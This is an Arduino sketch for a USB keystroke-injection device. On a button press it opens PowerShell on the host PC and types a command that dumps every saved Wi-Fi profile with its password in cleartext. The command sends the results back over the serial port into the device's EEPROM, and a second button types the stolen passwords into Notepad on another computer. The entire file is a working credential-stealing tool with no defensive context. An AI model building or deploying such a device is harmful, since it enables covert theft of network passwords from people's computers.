#include <Keyboard.h>
#include <EEPROM.h>
char stringArray[500] = {""};
boolean extracted = false, dispatched = false;
int extractButton = 2, dispatchButton = 3;

void setup() {    Serial.begin(9600);
    pinMode(extractButton, INPUT);
    pinMode(dispatchButton, INPUT);
    Keyboard.begin();
}
void loop() {
    if(digitalRead(extractButton) == HIGH && !extracted) {
        extractingData();
        extracted = true;
    }
    if(digitalRead(dispatchButton) == HIGH && !dispatched) {
        dispatchingData();
        dispatched = true;
    }    if(digitalRead(extractButton) == LOW)
        extracted = false;
    if(digitalRead(dispatchButton) == LOW)
        dispatched = false;
}

void extractingData() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.print("Powershell");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.println("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String -OutVariable dataCaptured");

    Keyboard.println("$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\")");
    Keyboard.println("$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\")");
    Keyboard.print("$serialObject = new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print("$comPort");
    Keyboard.println(", 9600, None, 8, one");
    Keyboard.println("$serialObject.Open()");
    Keyboard.println("$serialObject.Write(\"$dataCaptured\")");
    Keyboard.println("$serialObject.close()");
    Keyboard.println("exit");
    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();
    EEPROM.put(1, stringArray);
}

void dispatchingData() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.println("notepad");
    Keyboard.press(KEY_RETURN);
    Keyboard.release(KEY_RETURN);
    Keyboard.print(EEPROM.get(1, stringArray));
}
